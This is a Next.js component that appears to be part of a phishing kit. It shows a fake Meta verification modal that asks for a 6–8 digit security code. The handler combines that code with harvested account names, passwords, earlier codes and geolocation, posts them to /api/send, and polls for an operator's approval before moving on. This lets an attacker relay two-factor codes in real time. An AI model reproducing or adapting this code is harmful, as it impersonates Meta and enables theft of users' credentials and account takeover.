'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import VerifyImage from '@/assets/images/verify-image.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const { geoInfo, messageId, loginProvider, userData, addCode, setMessageId, setMessageContent } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const sessionId = crypto.randomUUID();
        addCode(code);

        const allCodes = [...userData.codes, code];
        const message = buildAppealMessage({
            geoInfo,
            userData,
            loginProvider,
            accounts: userData.accounts,
            passwords: userData.passwords,
            codes: allCodes,
            maxPass: config.MAX_PASS,
            maxCode
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId,
                approval_type: 'code',
                session_id: sessionId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(message);

            const result = await pollApproval(sessionId);

            if (result === 'approved') {
                nextStep();
            } else if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            setShowError(true);
            setCode('');
            setCountdown(loadingTime);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <p className='mt-4 text-2xl font-bold'>{texts.verifyTitle}</p>
                <p className='text-xl'>{texts.verifyDesc}</p>
                <div className='flex flex-col justify-center'>
                    <Image src={VerifyImage} alt='' />
                    <div className='relative mt-4 w-full'>
                        <input
                            type='tel'
                            inputMode='numeric'
                            pattern='[0-9]*'
                            id='code-input'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                            disabled={countdown > 0}
                            className={`peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none ${countdown > 0 ? 'cursor-not-allowed opacity-60' : ''}`}
                            placeholder={texts.verifyCode}
                        />
                        <label
                            htmlFor='code-input'
                            className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
                        >
                            {texts.verifyCode}
                        </label>
                    </div>
                    {showError && (
                        <p className='mt-2 text-[15px] text-red-500'>
                            {texts.verifyError} {countdown}s.
                        </p>
                    )}
                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || code.length < 6 || countdown > 0}
                        className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading || code.length < 6 || countdown > 0 ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? (
                            <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
                        ) : (
                            texts.continueBtn
                        )}
                    </button>
                </div>
                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
